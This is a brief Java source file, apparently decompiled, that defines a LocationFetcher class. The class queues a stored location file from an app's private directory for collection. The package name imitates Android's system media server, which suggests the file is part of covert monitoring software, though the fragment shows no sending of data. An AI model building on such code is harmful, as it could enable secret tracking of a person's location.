package com.android.mediaserver.fetchers.info;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import io.nlopez.smartlocation.geofencing.providers.GeofencingGooglePlayServicesProvider;
import java.io.File;
import java.util.ArrayList;

public class LocationFetcher extends FileFetcher {
  public LocationFetcher() {
    mFetchedFiles = new ArrayList();
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.android.mediaserver/app_my_files/location"),
            "TEXT", GeofencingGooglePlayServicesProvider.LOCATION_EXTRA_ID));
  }
}
